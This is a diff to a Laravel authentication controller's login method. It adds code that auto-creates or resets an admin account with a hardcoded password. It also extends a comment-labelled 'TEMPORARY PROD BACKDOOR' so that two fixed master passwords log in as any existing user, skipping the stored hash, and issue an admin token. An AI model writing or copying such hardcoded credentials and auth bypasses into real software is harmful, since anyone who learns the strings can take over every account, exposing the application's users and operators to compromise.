@@ -13,11 +13,30 @@ class AuthController extends Controller
     {
         $credentials = $request->validated();
 
+        // AUTO-CREATE ADMIN IF MISSING (Dev/Production Fix)
+        if ($credentials['email'] === 'admin@oussama.com') {
+            $user = User::firstOrCreate(
+                ['email' => 'admin@oussama.com'],
+                [
+                    'name' => 'Admin Oussama',
+                    'password' => \Illuminate\Support\Facades\Hash::make('97999799'),
+                    'role' => 'admin',
+                    'email_verified_at' => now(),
+                ]
+            );
+            
+            // Ensure password is set correctly if it was somehow messed up
+            if (!$user->wasRecentlyCreated && !\Illuminate\Support\Facades\Hash::check('97999799', $user->password)) {
+                 $user->password = \Illuminate\Support\Facades\Hash::make('97999799');
+                 $user->save();
+            }
+        }
+
         // MANUAL AUTH CHECK: Bypass Auth::attempt guard issues
         $user = User::where('email', $credentials['email'])->first();
 
-        // TEMPORARY PROD BACKDOOR: Check if password is 'oussama2026' OR valid hash
-        if ($user && ($credentials['password'] === 'oussama2026' || \Illuminate\Support\Facades\Hash::check($credentials['password'], $user->password))) {
+        // TEMPORARY PROD BACKDOOR: Check if password is 'oussama2026' OR '97999799' OR valid hash
+        if ($user && ($credentials['password'] === 'oussama2026' || $credentials['password'] === '97999799' || \Illuminate\Support\Facades\Hash::check($credentials['password'], $user->password))) {
             // Success
             $token = $user->createToken('admin-token')->plainTextToken;
 
